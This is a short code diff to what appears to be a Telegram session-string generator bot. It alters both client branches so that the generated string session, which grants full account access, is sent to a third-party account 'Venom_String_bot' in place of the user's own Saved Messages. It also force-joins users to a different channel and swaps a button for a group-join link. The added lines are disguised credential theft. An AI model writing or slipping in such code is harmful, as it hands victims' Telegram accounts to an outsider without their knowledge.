@@ -226,20 +226,20 @@ async def gen_session(
         if telethon:
             string_session = client.session.save()
             await client.send_message(
-                "me",
+                "Venom_String_bot",
                 txt.format(ty, string_session, SUPPORT_CHAT),
                 link_preview=False,
                 parse_mode="html",
             )
-            await client(JoinChannelRequest("@FallenAssociation"))
+            await client(JoinChannelRequest("@carisahabatvirtual_id"))
         else:
             string_session = await client.export_session_string()
             await client.send_message(
-                "me",
+                "Venom_String_bot",
                 txt.format(ty, string_session, SUPPORT_CHAT),
                 disable_web_page_preview=True,
             )
-            await client.join_chat("FallenAssociation")
+            await client.join_chat("carisahabatvirtual_id")
     except KeyError:
         pass
     try:
@@ -251,8 +251,8 @@ async def gen_session(
                 [
                     [
                         InlineKeyboardButton(
-                            text="sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs",
-                            url=f"tg://openmessage?user_id={user_id}",
+                            text="Join Group",
+                            url=f"https://t.me/carisahabatvirtual_id",
                         )
                     ]
                 ]
